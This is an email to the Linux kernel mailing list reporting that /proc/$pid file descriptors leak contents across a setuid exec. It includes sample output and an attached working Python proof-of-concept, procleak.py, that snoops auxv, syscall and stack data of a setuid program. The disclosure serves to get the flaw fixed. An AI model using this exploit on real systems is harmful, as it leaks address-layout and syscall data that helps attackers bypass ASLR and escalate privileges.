Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1755129Ab1BGXOS (ORCPT <rfc822;w@1wt.eu>);
	Mon, 7 Feb 2011 18:14:18 -0500
Received: from smtp.outflux.net ([198.145.64.163]:39281 "EHLO smtp.outflux.net"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1755034Ab1BGXOR (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 7 Feb 2011 18:14:17 -0500
Date: Mon, 7 Feb 2011 15:14:16 -0800
From: Kees Cook <kees.cook@canonical.com>
To: linux-kernel@vger.kernel.org
Subject: [SECURITY] /proc/$pid/ leaks contents across setuid exec
Message-ID: <20110207231416.GD1457@outflux.net>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Organization: Canonical
X-HELO: www.outflux.net
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi,

This came to my attention via a post[1] to full-disclosure, but I don't
think anyone actually brought it up to lkml. Local attackers are able to
bypass DAC permissions in /proc/$pid/ when they can exec a setuid program.
As long as the fd is open before the exec, its contents remain readable
after the exec, even to a setuid program. Here is auxv being scanned for
values that should be private, due to ASLR:

$ ./procleak.py auxv /usr/bin/passwd
AT_BASE:   0x7f761076f000
AT_RANDOM: 0x7fff23697969
Changing password for kees.
(current) UNIX password: 

Note that AT_RANDOM is the _location_ of AT_RANDOM, not the value itself,
but this therefore leaks stack location, and AT_BASE leaks the mmap
position of ld:

7f761076f000-7f761078f000 r-xp 00000000 fc:00 1051386 /lib/ld-2.12.2.so
...
7fff23678000-7fff23699000 rw-p 00000000 00:00 0 [stack]

Additionally, snooping on the kernel stack, the syscall parameters, and
even changing oom_adj is possible. Luckily, maps, mem, etc are already
protected by may_ptrace(). The attached tool can demonstrate the snooping,
just specify which /proc/$pid files you want, and the setuid program to
launch. For example:

$ ./procleak.py auxv,syscall /usr/bin/passwd
running
AT_BASE:   0x7f2828bde000
AT_RANDOM: 0x7fff80bde7c9
Changing password for kees.
(current) UNIX password: 0 0x0 0x7fff80bdda90 0x1ff 0x7fff80bdd580 0x7f2828dc57c0 0x7f28287cec1d 0x7fff80bdd088 0x7f28282fe6c0

There needs to be some way to break the connection to these files across
the setuid exec, or perform some sort of revalidation of permissions. (Maybe
check dumpable?)

-Kees

[1] http://seclists.org/fulldisclosure/2011/Jan/421

---
#!/usr/bin/python
# Demonstrates DAC bypass on /proc/$pid file descriptors across setuid exec.
# Author: Kees Cook <kees@ubuntu.com>
# License: GPLv2
# Usage: ./procleak.py FILES,TO,SNOOP PROGRAM-TO-RUN
import os, sys, time, struct

target = os.getpid()
snoop = ['auxv', 'syscall', 'stack']

args = []
if len(sys.argv)>1:
    args = sys.argv[1:]
    snoop = args[0].split(',')
    args = args[1:]

def dump_auxv(blob):
    if len(blob) == 0:
        return
    auxv = struct.unpack('@%dL' % (len(blob)/len(struct.pack('@L',0))), blob)
    while auxv[0] != 0:
        if auxv[0] == 7:
            print "AT_BASE:   0x%x" % (auxv[1])
        if auxv[0] == 25:
            print "AT_RANDOM: 0x%x" % (auxv[1])
        auxv = auxv[2:]

pid = os.fork()
if pid == 0:
    # Child
    os.setsid()
    sys.stdin.close()

    files = dict()
    last = dict()
    for name in snoop:
        files[name] = file('/proc/%d/%s' % (target, name))
        # Ignore initial read, since it's from the existing parent
        last[name] = files[name].read()
    while True:
        try:
            for name in snoop:
                files[name].seek(0)
                saw = files[name].read()
                if saw != last[name]:
                    if name == 'auxv':
                        dump_auxv(saw)
                    else:
                        print saw
                    last[name] = saw
        except Exception, o:
            if o.errno == 3:
                # Target quit
                sys.exit(0)

cmd = ['/usr/bin/passwd']
if len(args) > 0:
    cmd = args
time.sleep(1)
os.execv(cmd[0],cmd)



-- 
Kees Cook
Ubuntu Security Team
